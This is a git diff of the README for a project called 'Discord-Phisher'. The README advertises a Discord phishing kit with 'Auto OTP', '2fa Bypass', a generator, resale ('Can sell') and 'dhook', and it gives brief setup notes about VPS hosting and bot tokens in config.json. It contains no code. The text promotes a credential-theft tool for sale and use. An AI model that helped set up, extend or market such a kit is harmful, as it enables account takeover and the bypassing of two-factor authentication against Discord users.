@@ -1,8 +1,6 @@
 # Discord-Phisher
 # Must have pip, python and git. vultr is recomended vps
-
-# Bot token is for /verify /premium and /view profile
-# Gen token has /webhook and /start so it would be your skyhelper bot
+if you have problems open an issue on github
 Auto OTP, 2fa Bypass, Generator, easy to use, Can sell, Can dhook.
 
 Edit the info in config.json to your bot (Gen = skyhelper, Bot = your server bot)
